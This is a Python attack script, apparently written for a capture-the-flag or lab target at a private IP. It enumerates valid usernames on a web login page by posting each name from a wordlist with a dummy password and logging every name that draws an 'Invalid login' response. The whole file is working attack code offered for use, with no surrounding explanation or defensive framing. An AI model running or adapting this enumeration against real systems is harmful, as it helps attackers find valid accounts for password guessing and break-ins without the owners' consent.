#!/usr/bin/python3
#Author: Conde

#Library
import requests
import os

#Colors
red = "\033[1;31m"
green = "\033[0;32m"
blue = "\033[1;34m"
yellow = "\033[1;33m"
purple = "\033[1;35m"
white = "\033[1;37m"
end = "\033[0m"

#Variables
URL = "http://10.10.11.160:5000/login"
file = open('users', 'r')

#Test file
if os.path.exists("ValidUsers.txt"):
    os.remove('ValidUsers.txt')

#Main
print(blue,"\n[*] Finding Valid Users\n",end)
for line in file:
    user = line.strip()
    payload = {'username': user,'password':'test', 'submit':'Submit'}
    r = requests.post(URL,data=payload)
    content = r.text
    if "Invalid login" in str(content):
        file1 = open('ValidUsers.txt','a')
        a = "User[✔]: " + user + "\n"
        file1.write(a)
        file1.close()
        print(f"\t{green}[✔] User found: {yellow}{user}{end}")
file.close()
